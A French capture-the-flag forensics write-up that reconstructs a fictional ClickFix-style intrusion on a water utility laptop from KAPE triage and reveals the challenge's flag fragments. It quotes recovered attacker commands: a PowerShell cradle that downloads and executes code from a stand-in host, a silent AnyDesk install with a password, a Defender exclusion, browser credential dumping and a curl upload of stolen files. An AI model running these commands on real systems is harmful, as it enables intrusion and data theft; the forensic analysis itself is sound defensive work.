---
tags: [forensics, kape, windows, browser]
---

[🇬🇧 English](README.md) · 🇫🇷 Français

# CAPTCHA THE WATER PLANT

| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
|---|---|---|---|---|---|---|
| forensics | 168 | 32 | ✅ | — | 0xAr3s-root | Marius Merai |

## Énoncé

> Nordvia Water Utility a perdu son panneau de contrôle de distribution et la pression s'est effondrée dans les districts nord. Un compte administrateur a été utilisé depuis l'un des trois laptops. Les collections de triage KAPE ont été prises après l'incident.
>
> Suivez les preuves depuis ce que l'utilisateur a exécuté, vers ce qu'il a lancé, vers la persistance laissée, et enfin vers les preuves navigateur exposées. Tous les hôtes et domaines des preuves sont fictifs. Analysez les fichiers fournis hors ligne uniquement.
> Pièces jointes : `ENG-LAPTOP-23.zip`, `FIELD-WKS-21.zip`, `OPS-NB-06.zip`.
> Format du flag : `CSCTF{...}`.

**Fichiers fournis :** `files/ENG-LAPTOP-23.zip`, `files/FIELD-WKS-21.zip`, `files/OPS-NB-06.zip` (non commités — actuellement dans `forensics/`, à déplacer plus tard)

## En bref

Triage KAPE parsé pour trois laptops ; seul OPS-NB-06 (utilisateur `ops06.nwu`) touche le C2 fictif. Cradle de téléchargement Win+R → le validator dépose le RMM AnyDesk (`C:\temp\Maitenance`, mot de passe unattended défini) → tâche planifiée quotidienne + persistance service → session de vol navigateur (dumps Nirsoft, exfil). Aucun `CSCTF{...}` littéral n'existe dans aucun artefact : le flag est **l'assemblage de trois fragments leetspeak**, un par étape de la chaîne (mot de passe RMM `f@k3_c@ptch@` + description de la tâche planifiée `_r3@l_m@lw@r3` + suffixe du token admin `cl1ckf1xed`). Soumis seuls, chacun était refusé.

## Démarche

**1. Reconnaissance — inventorier les trois collections, attribuer l'hôte**

Chaque zip contient `Kape-parsed-<HOST>/` (EventLogs, FileFolderAccess, FileSystem, ProgramExecution, Registry, SRUM, WebBrowsers/Hindsight_output.xlsx ; seul OPS-NB-06 a `Persistence/`). Première question : quel laptop a exécuté le compte admin contre le C2 ?

```bash
for h in ENG-LAPTOP-23 FIELD-WKS-21 OPS-NB-06; do
  unzip -p $h.zip "*EvtxECmd_Output.csv" | grep -c -i 'zindetify\|validator'
done
# ENG : 0, FIELD : 0, OPS : des dizaines
```

ENG-LAPTOP-23 (`eng-23.nwu`, ingénieur) et FIELD-WKS-21 (`field21.nwu`, opérateur terrain) sont des builds sains : bundle Ninite, durcissement Yamato WELA, KB5020044, KeePass/PuTTY/Thunderbird, tokens par rôle (`NVW-ENG-*`, `NVW-FIELD-*`, suffixe commun `a7f39c2e`), auto-collecte KAPE. Aucun abus de script-host, aucun RMM hors l'AnyDesk légitime de FIELD via Ninite, aucune persistance personnalisée.

**2. Hypothèse — OPS-NB-06 est le laptop admin opéré par l'attaquant**

`Registry/*UserActivity_Output.csv` (UserAssist/RunMRU, utilisateur `ops06.nwu`, 2026-10-21 04:30:47) :

```
powershell.exe -nop -ep Bypass "[System.Text.Encoding]::UTF8.GetString(
  (New-Object System.Net.WebClient).DownloadData(
  'http://zindetify.dev.boot:8080/validator')) | iex"
```

Le 4688 Security dans `EventLogs/*EvtxECmd_Output.csv` confirme la chaîne : `explorer.exe → powershell.exe` (cradle) → `C:\temp\Maitenance\Setup\AnyDesk.exe --install ... --start-with-win --silent` (04:31:04), ré-exécuté chaque jour en `SYSTEM` à 15:10 (tâche planifiée).

**3. Exploitation — validator, persistance, mot de passe RMM, butin navigateur**

Le ScriptBlockLogging PowerShell (4104) dans le même Evtx capture le corps du `validator` : ~50 fonctions leurres `Get-Data01…50` plus les vraies étapes — `Register-ScheduledTask 'Maitenance Check …' -Daily -At 11:10AM` avec le cradle en action, téléchargement AnyDesk depuis `/tool`, installation, puis :

```
--set-password "f@k3_c@ptch@"
```

Persistance (`Persistence/Scheduled Tasks.csv`, UTF-16, + `Registry/*ASEPs*.csv`) :

- `\Maitenance Check ????` (emoji en MFT : `Maitenance Check 👍🙈`), RunAs `ops06.nwu`, quotidienne, action = cradle, commentaire `_r3@l_m@lw@r3` (= `_real_malware`).
- `HKLM\SYSTEM\...\Services\AnyDesk` (démarrage auto, LocalSystem), six règles firewall allow, associations `.anydesk`.
- `Run/RunOnce` : uniquement OneDrive/Edge/KeePass/SecurityHealth légitimes.

Session interactive (4104, PID 2364, 2026-10-28 03:46–04:06) : `whoami`, `net localgroup administrators`, exclusion Defender, `wget …/suite -OutFile nirsoft_pass_and_history.zip`, `BrowsingHistoryView.exe /stext browhisto.txt` (133 Ko), `WebBrowserPassView.exe /stext webpass.txt` (**2 octets = aucun mot de passe enregistré ; tous les logins étaient en declined-save**), `Compress-Archive *.txt → out.zip`, exfil `curl -F "file=out.zip" http://zindetify.dev.boot:8080/up/{$guid}`. La MFT corrobore chaque fichier (`nirsoft/`, `here.txt`, `out.txt`, `browhisto.txt`, `webpass.txt`, `out.zip`).

Navigateur (`WebBrowsers/Hindsight_output.xlsx`, profil Edge `ops06.nwu`) : boucles `www` → `water-monitor` → `admin-control` (`NVW-OPS-892` pré-compromission 10-16, `NVW-OPS-739` 10-21 04:31:31 UTC pendant l'attaque, `NVW-ADMIN-cl1ckf1xed` session interactive 10-28). Les tokens par rôle sont `NVW-<ROLE>-<n>-a7f39c2e` ; le seul qui sort du moule est `NVW-ADMIN-cl1ckf1xed`, dont le suffixe `cl1ckf1xed` (« clickfixed ») est un fragment leetspeak.

**4. Assemblage — un fragment par étape de l'énoncé**

L'énoncé énumère quatre étapes (exécuté → lancé → persistance → navigateur) ; les trois dernières livrent chacune un fragment de même style :

| Étape | Artefact | Fragment |
|---|---|---|
| Lancé (RMM) | 4104 `--set-password` | `f@k3_c@ptch@` |
| Persistance | `Scheduled Tasks.csv`, description = sortie de `Get-Data51` (`/config`, la seule fonction hors série 01–50) | `_r3@l_m@lw@r3` |
| Navigateur | token `NVW-ADMIN-cl1ckf1xed` (Hindsight) | `cl1ckf1xed` |

Le `_` initial du 2ᵉ fragment indique la concaténation directe ; le 3ᵉ est joint par `_`. Mes trois premières soumissions échouaient parce que je soumettais **un seul** fragment à la fois.

```bash
python3 solve/solve.py files/
```

```
[+] Assembled flag (3 fragments): flag{...}   (masqué)
```

Script de résolution : [`solve/solve.py`](solve/solve.py)

## Flag

`flag{...}` (masqué — assemblage des 3 fragments `f@k3_c@ptch@` + `_r3@l_m@lw@r3` + `_cl1ckf1xed` )

## Ce que j'ai appris

- Attribuer l'hôte d'abord (références C2 par hôte) fait gagner des heures : deux collections sur trois sont des leurres avec les mêmes domaines fictifs.
- Les CSV KAPE parsés répondent à toute la chaîne sans rien monter : RunMRU/UserAssist → Prefetch/Amcache → ScheduledTasks/ASEPs → Hindsight Timeline/Sessions. Le 4104 est le bonus qui révèle le mot de passe RMM et la boucle d'exfil (`type`, `Compress-Archive`, `curl /up/{guid}`).
- Le `Scheduled Tasks.csv` est en UTF-16 (sortie schtasks, pas UTF-8 parsé KAPE) — un `grep` naïf sur les octets bruts le rate ; le parser en UTF-16.
- Quand rien de littéral n'existe, chercher des **fragments de même style** (ici leetspeak avec `@`/chiffres) répartis sur les étapes que l'énoncé énumère : un `grep` sur `[a-z]@[a-z]` a trouvé le mot de passe, la description de tâche et le token en une passe. Soumettre chaque fragment seul était l'erreur.
- La sortie du stealer compte même quand elle est vide : `webpass.txt` de 2 octets + logins declined-save prouvent qu'aucun credential n'était enregistré ; le butin exfiltré, c'était l'historique — et le secret actionnable de la chaîne, c'est le mot de passe RMM (`f@k3_c@ptch@`, « fake captcha » = titre).

## Outils et références

- Python 3 (`zipfile`, `csv`, `re`, `openpyxl`) + `unzip -p … | grep`
- Outils Eric Zimmerman via modules KAPE (RECmd, PECmd, AmcacheParser, EvtxECmd, Hindsight)
- NirSoft WebBrowserPassView / BrowsingHistoryView (côté attaquant, d'après les preuves)
- MITRE ATT&CK : T1059.001 (PowerShell), T1219 (RMM), T1053.005 (tâche planifiée), T1555 (credentials dans fichiers — tenté)

---
[⬅ Retour à l'événement](../../README.fr.md)
